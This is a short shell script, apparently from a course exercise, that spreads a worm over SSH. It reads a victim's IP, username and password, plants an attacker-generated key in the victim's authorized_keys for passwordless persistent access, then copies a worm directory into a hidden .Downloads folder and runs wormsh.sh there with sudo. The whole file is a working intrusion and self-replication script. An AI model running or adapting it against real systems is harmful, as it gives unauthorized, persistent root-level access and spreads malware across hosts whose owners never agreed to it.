#!/bin/sh

#connect to victim and ssh without password
read victim_ip username password
ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
sshpass -p "$password" scp -o "StrictHostKeyChecking no" -o "IdentitiesOnly=yes" ~/.ssh/id_rsa.pub $username@$victim_ip:~
sshpass -p "$password" ssh -o "IdentitiesOnly=yes" $username@$victim_ip "mkdir .Downloads; mv id_rsa.pub .ssh/authorized_keys"

#replicate worm through ssh
scp -o "IdentitiesOnly=yes" -r ../0516020-0516066 $username@$victim_ip:~/.Downloads
#exec worm through ssh
ssh -o "IdentitiesOnly=yes" $username@$victim_ip "cd ~/.Downloads/0516020-0516066/; sudo -S <<< $password sh wormsh.sh"

